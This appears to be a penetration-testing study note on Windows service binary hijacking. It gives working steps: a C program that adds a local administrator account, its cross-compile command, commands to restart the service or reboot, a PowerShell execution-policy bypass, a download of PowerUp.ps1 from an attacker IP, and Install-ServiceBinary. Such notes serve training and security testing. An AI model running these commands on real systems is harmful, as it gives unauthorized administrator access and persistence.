
Windows Services are long-running background executable or applications managed by the `Service Control Manager`.

They can be manage by the `Services snap-in`, `PowerShell`, or `sc.exe command line tool`.

Windows uses the `LocalSystem`, `Network Service`, and `Local Service`, user accounts to run its own services.

Users or programs creating a service can choose either one of the accounts from the above, a domain user or a local user.

#### Service Binary Hijacking

We can check installed services using `services.msc`, `Get-Service`, or `Get-CimInstance`

`Get-Service and Get-CimInstance` requires administrative user when using shell (UAC), but can be used with RDP.

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}` get services running under the win32 service class and only read the name, state and pathname of running services - we should look for service binaries out side of system32, these binaries are managed and installed by users, which could result in poor permissions/management of binary

binary permissions:

`I` indicates that the permission is inherent of the parent directory, without `I` we can draw the conclusion that the binary's permissions was set on purpose to that permission.

| MASK | PERMISSIONS             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

`icacls "C:\xampp\apache\bin\httpd.exe"` or `Get-ACL "C:\xampp\apache\bin\httpd.exe"` - read binary permissions

If we find a service that we can replace, we can replace it with the below binary to add our own administrative user.

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` - we can cross-compile our binary for a 64 bit system

`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}` - check the start mode of a specific service to determine how we will restart the service

`whoami /priv` - list out privileges to see if we can restart the system to refresh the binary (if the startup is set to auto, we need `SeShutdownPrivilege)` (state is for the current command whoami, we only need to see the presence of the privilege)

`net stop mysql` & `net start mysql` stop and start a service to reset the binary for PrivEsc 

`shutdown /r /t 0` - reboot the machine in zero seconds if we need to reboot

*after reboot check if the binary as worked, maybe check the administrators group to see if our user was added*

`If we have gui access and have successfully added a new user, we may need to spawn an administrative powershell and log in with the new users credentials to get privileges we need to access other folders on the system like other admin folders.`

#### Automate service hijacking

We can use `/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1` to detect an escalation vector on a windows system.

```
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

 . .\PowerUp.ps1
 
Get-ModifiableServiceFile
```

`Install-ServiceBinary -Name 'mysql'` replace the service binary with out malicious binary which by default adds a new user `john` with the password `Password123!` to the `administrators group`
